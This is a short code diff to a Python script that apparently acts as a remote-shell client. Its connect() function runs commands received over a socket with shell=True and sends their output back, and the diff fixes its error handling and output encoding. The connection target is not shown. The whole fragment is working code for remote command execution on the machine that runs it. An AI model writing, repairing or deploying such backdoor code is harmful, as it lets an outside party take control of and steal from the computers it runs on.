@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+from os import error
 import modules, urllib.request, time, socket, subprocess
 import modules.socketnoise as socketnoise
 
@@ -46,8 +47,8 @@ def connect():
 		else:
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-				socketnoise.respond(s, CMD.stdout.read() + CMD.stderr.read() ) 
-			except e:
+				socketnoise.respond(s, str(CMD.stdout.read()) + str(CMD.stderr.read()) ) 
+			except error as e:
 				socketnoise.respond(s, f'[ERROR] {e}')
 
 	return
